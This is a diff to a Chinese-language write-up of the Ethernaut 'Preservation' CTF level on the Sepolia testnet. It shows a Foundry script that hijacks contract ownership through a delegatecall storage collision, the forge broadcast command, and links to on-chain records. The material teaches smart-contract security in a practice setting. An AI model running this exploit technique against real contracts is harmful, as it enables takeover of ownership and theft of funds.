@@ -641,16 +641,31 @@ contract Attacker {
 
 攻击脚本：
 ```
-address player = vm.addr(1);
-vm.startPrank(player);
+...
+address levelAddr = 0x20FD051bF1d72a491674d9259dc7a155160bdF9d;
+Preservation level = Preservation(levelAddr);
 
+Attacker attacker = new Attacker();
+
+// 第一次调用把 timeZone1Library1 改为攻击者地址
 level.setFirstTime(uint256(uint160(address(attacker))));
 
-level.setFirstTime(uint256(uint160(address(player))));
+// 第二次调用其实是 delegatecall attacker 的 setTime 函数把 owner 设置为 sender
+level.setFirstTime(uint256(uint160(address(sender))));
 ```
 
-完整代码见：[这里](Writeup/phipupt/ethernaut/test/level16.s.sol)
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level16.s.sol)
 
+
+执行脚本：
+```
+forge script script/Level16.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+链上记录：
+- [level(`Preservation`)](https://sepolia.etherscan.io/address/0x20FD051bF1d72a491674d9259dc7a155160bdF9d)
+- [Attacker](https://sepolia.etherscan.io/tx/0x937C8d10E36DdaD95C6F9765807A9fd5266e8C7e)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x800f92f8f9b6be1f3119f7ce3708616482e02bf97ecab5e28b14fd7a5470c34f)
 
 ### 2024.09.14
 
